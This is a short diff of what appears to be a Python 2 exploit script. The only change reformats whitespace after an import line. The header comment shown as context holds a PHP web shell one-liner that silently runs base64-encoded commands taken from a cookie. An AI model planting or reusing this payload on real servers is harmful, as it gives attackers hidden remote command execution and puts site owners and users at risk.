@@ -10,7 +10,7 @@ import os                                     #
 import sys                                    #
 from sys import argv                          #
 from urllib2 import build_opener, HTTPHandler #
-import optparse 					           #
+import optparse 		              #
 ############################################################################
 #                                                                          #
 # Code: <?php error_reporting(0); system(base64_decode($_COOKIE["1"])); ?> #
